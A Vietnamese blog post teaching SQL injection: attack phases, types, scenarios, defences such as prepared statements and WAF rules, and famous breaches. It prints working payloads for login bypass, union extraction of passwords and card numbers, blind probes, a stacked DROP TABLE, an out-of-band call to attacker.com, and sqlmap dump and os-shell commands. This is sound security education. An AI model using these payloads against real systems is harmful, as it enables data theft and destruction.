---
title: "SQL Injection – Khi một dòng query có thể phá hủy tất cả"
date: 2024-12-25 17:35:00 +0700
categories: [Notes, Cybersecurity, Database]
tags: [sql injection, web security, database security, cybersecurity, owasp, penetration testing, vulnerability]
pin: false
comments: false
published: true
---

Nếu bạn nghĩ SQL Injection chỉ là một từ khóa fancy để làm cho resume trông pro hơn, thì mình có tin buồn: đây chính là lý do tại sao tài khoản ngân hàng của bạn có thể bị "thăm nom" bởi những người bạn chưa bao giờ mời.

SQL Injection không chỉ là #1 trong OWASP Top 10 suốt nhiều năm mà còn là "classic hit" trong thế giới cybersecurity - giống như "Despacito" vậy, ai cũng biết nhưng vẫn cứ nghe hoài.

## SQL Injection Là Cái Quái Gì?

SQL Injection (SQLi) xảy ra khi kẻ tấn công có thể "len lỏi" SQL code độc hại vào các câu query của ứng dụng. Hình dung như thế này: bạn đang nói chuyện với database bằng tiếng SQL, và đột nhiên có người chen ngang, thay đổi câu nói của bạn thành thứ hoàn toàn khác.

**Ví dụ đơn giản:**
```sql
-- Query bình thường
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'

-- Query sau khi bị injection
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

Dấu `--` trong SQL là comment, nghĩa là mọi thứ phía sau nó sẽ bị bỏ qua. Vậy là password check bị "vô hiệu hóa" một cách lịch sự.

## Anatomy Của Một Cuộc Tấn Công SQL Injection

### **Discovery Phase**

Hacker không phải là người đi bộ rồi tình cờ gặp được website vulnerable. Họ có systematic approach:

**Error-based Discovery:**
```
https://vulnerable-site.com/product?id=1'
```

Nếu website trả về lỗi kiểu:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
```

Chúc mừng! Bạn vừa tự "tố" mình rằng website vulnerable với SQL injection.

**Boolean-based Discovery:**
```
https://vulnerable-site.com/product?id=1 AND 1=1  // Trang load bình thường
https://vulnerable-site.com/product?id=1 AND 1=2  // Trang bị lỗi hoặc không load
```

### **Information Gathering**

Một khi xác định được injection point, hacker sẽ thu thập thông tin về database:

**Database Version:**
```sql
' UNION SELECT VERSION()--
```

**Table Names:**
```sql
' UNION SELECT table_name FROM information_schema.tables--
```

**Column Names:**
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

### **Data Extraction**

Đây là lúc mọi thứ trở nên nghiêm trọng:
```sql
' UNION SELECT username, password FROM users--
```

## Các Loại SQL Injection: "Gia Đình Nhà Sqli"

### **In-band SQL Injection**
*"Loại thẳng thắn, không che giấu"*

**Error-based:**
Lỗi database được hiển thị trực tiếp trên webpage. Giống như việc bạn la hét "TÔI ĐANG BỊ HACK" trên speaker.

```sql
-- Input: ' OR 1=1 UNION SELECT null,@@version,null--
-- Error: Duplicate column name 'version 5.7.29-log'
```

**Union-based:**
Sử dụng UNION operator để kết hợp kết quả của câu query gốc với câu query độc hại.

```sql
' UNION SELECT null,username,password FROM admin--
```

### **Inferential SQL Injection (Blind)**
*"Loại bí ẩn, phải đoán mò"*

**Boolean-based:**
```sql
-- Nếu admin user tồn tại, trang trả về content bình thường
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--

-- Nếu không tồn tại, trang trả về content khác hoặc lỗi
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=0--
```

**Time-based:**
```sql
-- Nếu điều kiện đúng, database sẽ "ngủ" 5 giây
' AND IF(1=1,SLEEP(5),0)--

-- Nếu sai, response trả về ngay lập tức
' AND IF(1=2,SLEEP(5),0)--
```

### **Out-of-band SQL Injection**
*"Loại gián điệp, dùng kênh bí mật"*

Sử dụng kênh khác (DNS, HTTP requests) để truyền dữ liệu:
```sql
'; EXEC xp_dirtree '\\attacker.com\share\'+@@version+'\'--
```

## Real-world Attack Scenarios: "Chuyện Có Thật Từ Đời Thực"

### Scenario 1: "Login Bypass Kinh Điển"

**Vulnerable Code:**
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Attack:**
```
Username: admin'--
Password: anything
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

Result: Đăng nhập thành công mà không cần password!

### Scenario 2: "Data Extraction Nightmare"

**Vulnerable URL:**
```
https://shop.com/product?category=electronics
```

**Attack:**
```
https://shop.com/product?category=electronics' UNION SELECT null,credit_card_number,null,null FROM payments--
```

Result: Tất cả credit card numbers được hiển thị trên trang sản phẩm!

### Scenario 3: "Time-based Blind Attack"

Khi không thể thấy output trực tiếp:
```sql
-- Kiểm tra độ dài password của admin
' AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))>10,SLEEP(5),0)--

-- Kiểm tra từng ký tự
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>65,SLEEP(5),0)--
```

## Advanced SQL Injection Techniques: "Ninja Level"

### **Second-Order SQL Injection**
*"Kẻ thù nằm vùng"*

Input độc hại được lưu trữ trong database và executed sau đó:

```php
// Lần 1: Lưu payload vào database
INSERT INTO users (username, email) VALUES ('admin', 'test@test.com'); DROP TABLE users;--')

// Lần 2: Khi query này chạy...
$query = "SELECT * FROM logs WHERE user = '" . $user['username'] . "'";
// Boom! Table users bị xóa
```

### **NoSQL Injection**
*"Thời đại mới, kỹ thuật mới"*

Với MongoDB:
```javascript
// Vulnerable
db.users.find({username: req.body.username, password: req.body.password})

// Attack payload
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

### **Polyglot Payloads**
*"Một mũi tên trúng nhiều đích"*

Payload hoạt động trên multiple database systems:
```sql
'||(SELECT CHR(65)||CHR(66)||CHR(67))||'
```

## Phòng Thủ: "Build Your Defense Wall"

### **Parameterized Queries/Prepared Statements**
*"Giải pháp vàng"*

**Sai:**
```php
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

**Đúng:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

**Tại sao hiệu quả?**
SQL query structure được define trước, input chỉ là data, không thể thay đổi query logic.

### **Input Validation và Sanitization**
*"Kiểm tra kỹ trước khi tin tưởng"*

```php
// Whitelist approach
if (!preg_match('/^[0-9]+$/', $_GET['id'])) {
    die('Invalid input');
}

// Escape special characters
$safe_input = mysqli_real_escape_string($connection, $_POST['username']);
```

### **Least Privilege Principle**
*"Đừng cho quyền admin cho người bán kẹo"*

```sql
-- Database user chỉ có quyền SELECT, INSERT, UPDATE
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';

-- Không cho quyền DROP, CREATE, ALTER
REVOKE DROP, CREATE, ALTER ON *.* FROM 'webapp'@'localhost';
```

### **Web Application Firewall (WAF)**
*"Người gác cổng"*

Một số WAF rules:
```
# Chặn common SQL injection patterns
SecRule ARGS "@detectSQLi" "phase:2,block,msg:'SQL Injection Attack'"

# Chặn UNION attacks
SecRule ARGS "@contains union" "phase:2,block"
```

### **Error Handling**
*"Đừng tự tố mình"*

**Sai:**
```php
if (!$result) {
    die('Error: ' . mysql_error()); // Lộ database structure
}
```

**Đúng:**
```php
if (!$result) {
    error_log('Database error: ' . mysql_error());
    die('An error occurred. Please try again.');
}
```

## Testing For SQL Injection: "Kiểm Tra Hàng Rào"

### Manual Testing Techniques:

**1. Single Quote Test:**
```
' hoặc "
```

**2. Numeric Test:**
```
1' OR '1'='1
1 OR 1=1
```

**3. Boolean Logic:**
```
' OR 1=1--
' OR 'a'='a
```

**4. Union Test:**
```
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
```

### Automated Tools:

**SQLmap - "Rolls Royce của SQL injection":**
```bash
# Basic scan
sqlmap -u "http://testsite.com/page?id=1"

# Dump database
sqlmap -u "http://testsite.com/page?id=1" --dump

# Get OS shell
sqlmap -u "http://testsite.com/page?id=1" --os-shell
```

**Burp Suite:**
- Intruder module cho automated testing
- SQLiPy extension cho advanced payloads

## Real-world Case Studies: "Những Vụ Hack Nổi Tiếng"

### **Heartland Payment Systems (2008)**
- **Damage:** 134 million credit cards compromised
- **Method:** SQL injection vào web application
- **Loss:** $140 million

### **Sony Pictures (2011)**
- **Damage:** 1 million user accounts
- **Method:** Simple SQL injection
- **Embarrassing fact:** Passwords stored in plain text

### **TalkTalk (2015)**
- **Damage:** 4 million customer records
- **Method:** SQL injection by a 15-year-old
- **Loss:** £77 million

## SQL Injection Trong Thời Đại Hiện Đại

### Cloud Databases:
```sql
-- AWS RDS với encrypted storage vẫn có thể bị SQL injection
-- Encryption chỉ protect data-at-rest, không protect từ application layer
```

### Microservices Architecture:
```
API Gateway -> Service A -> Service B -> Database
     ↑              ↑
   Potential      Potential
   SQLi point     SQLi point
```

### GraphQL:
```graphql
query {
  user(id: "1; DROP TABLE users--") {
    name
    email
  }
}
```

## Best Practices: "Kinh Nghiệm Xương Máu"

### **Defense in Depth**
- Input validation
- Parameterized queries
- WAF
- Database permissions
- Monitoring và logging

### **Security Testing**
```bash
# Automated scanning
sqlmap -u "http://yoursite.com/page?id=1" --batch

# Manual testing
' OR 1=1--
" OR "1"="1
) OR (1=1
```

### **Code Review Checklist**
- [ ] Tất cả database queries đều sử dụng parameterized statements?
- [ ] Input validation được implement đúng cách?
- [ ] Error messages không lộ sensitive information?
- [ ] Database user có least privilege?

### **Monitoring và Detection**
```sql
-- Log suspicious queries
SELECT * FROM mysql.general_log WHERE argument LIKE '%UNION%' OR argument LIKE '%DROP%';

-- Monitor failed login attempts
SELECT COUNT(*) FROM auth_logs WHERE success = 0 AND timestamp > NOW() - INTERVAL 1 HOUR;
```

## Kết Luận: "SQL Injection - Kẻ Thù Cũ Nhưng Vẫn Nguy Hiểm"

SQL Injection giống như cảm cúm - ai cũng biết nhưng vẫn cứ bị mắc. Đây là vulnerability đã tồn tại hơn 20 năm nhưng vẫn xuất hiện trong hầu hết các ứng dụng web hiện đại.

**Key takeaways:**
- SQL Injection không chỉ là technical issue mà còn là business risk
- Prevention tốt hơn cure - implement secure coding practices từ đầu
- Testing phải là continuous process, không phải one-time activity
- Education là chìa khóa - developer phải hiểu security fundamentals

**Final wisdom:**
Trong thế giới cybersecurity, chỉ có hai loại tổ chức: những tổ chức đã bị hack và những tổ chức chưa biết mình đã bị hack. Đừng để SQL injection biến bạn thành loại thứ nhất.

## Resources và Tools

### Learning Resources:
- **OWASP SQL Injection Prevention Cheat Sheet**
- **PortSwigger Web Security Academy**
- **SQLi-labs** - Hands-on practice
- **DVWA (Damn Vulnerable Web Application)**

### Essential Tools:
- **SQLmap** - Automated SQL injection exploitation
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Free security testing proxy
- **NoSQLMap** - NoSQL injection testing

### Practice Platforms:
- **HackTheBox**
- **TryHackMe**
- **VulnHub**
- **OverTheWire**

---

*Remember: "With great power comes great responsibility" - Uncle Ben (và cả security professionals). Sử dụng kiến thức này để protect, không phải để attack.*

---